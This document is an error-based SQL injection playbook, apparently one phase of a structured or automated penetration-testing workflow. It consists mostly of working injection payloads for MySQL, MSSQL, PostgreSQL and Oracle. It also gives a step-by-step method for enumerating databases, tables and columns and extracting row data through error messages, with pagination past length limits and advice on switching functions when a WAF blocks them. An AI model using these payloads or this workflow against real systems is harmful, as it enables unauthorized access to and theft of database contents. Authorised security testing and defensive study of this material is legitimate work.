# Error-Based SQLi

## Prerequisites

- HIGH confidence from Phase 2 (injection confirmed)
- Verbose SQL errors displayed in response
- Error messages contain query output or DB information

## Core Principle

Force SQL errors that leak data in error messages. Fast extraction when errors are verbose.

## Error Detection

Trigger error with malformed input:
```
'           → check for SQL syntax error in response
' AND 1=CONVERT(int,'a')-- -   → type conversion error
```

**Good sign:** Error contains table names, query fragments, or DB-specific messages.
**Bad sign:** Generic "error occurred" → errors suppressed, use blind methods.

## Database-Specific Techniques

### MySQL

**EXTRACTVALUE (XML):**
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -
```
Error: `XPATH syntax error: '~dbname~'`

**UPDATEXML:**
```
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -
```

**Double query (stacked):**
```
'; SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a-- -
```

### MSSQL

**CONVERT error:**
```
' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -
```
Error: `Conversion failed when converting 'dbname'`

**CAST error:**
```
' AND 1=CAST((SELECT @@version) AS int)-- -
```

### PostgreSQL

**CAST error:**
```
' AND 1=CAST((SELECT version()) AS int)-- -
```

**XML functions:**
```
' AND 1=CAST(query_to_xml('SELECT username FROM users',true,true,'') AS int)-- -
```

### Oracle

**UTL_INADDR:**
```
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -
```

**CTXSYS.DRITHSX.SN:**
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
```

**XMLType:**
```
' AND (SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual) IS NOT NULL-- -
```

## Extraction Workflow

### Step 1: Confirm Error Visibility

Test with a marker:
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,'test',0x7e))-- -
```

Look for `~test~` in error message. If visible, proceed.

### Step 2: Extract Data

Replace 'test' with target subqueries:
1. **Database info:** `(SELECT database())`, `(SELECT user())`, `(SELECT @@version)`
2. **Table names:** `(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)`
3. **Column names:** `(SELECT column_name FROM information_schema.columns WHERE table_name='x' LIMIT 0,1)`
4. **Data:** `(SELECT CONCAT(col1,':',col2) FROM table LIMIT 0,1)`

Increment LIMIT offset to iterate rows.

## Output Length Limits

Error messages often truncate. Use SUBSTRING to paginate:
```
SUBSTRING((SELECT x),1,30)   -- chars 1-30
SUBSTRING((SELECT x),31,30)  -- chars 31-60
```

## Attempt Limits

- Max 5 error technique variations per DB type
- Schema enum: Max 50 tables, 20 columns per table
- Data extraction: paginate with LIMIT, max 100 rows per table

## Common Failures

| Symptom | Cause | Fix |
|---------|-------|-----|
| Generic error only | Verbose errors disabled | Use blind methods |
| Empty error output | Subquery returns NULL | Check query syntax |
| Truncated data | Error length limit | Use SUBSTRING pagination |
| Error function blocked | WAF filtering | Try alternate functions |

## Stop Conditions

- No data in error messages after 5 techniques → pivot to UNION or blind
- Errors become generic mid-extraction → errors now suppressed, pivot
- Rate limiting on errors → back off, consider blind methods
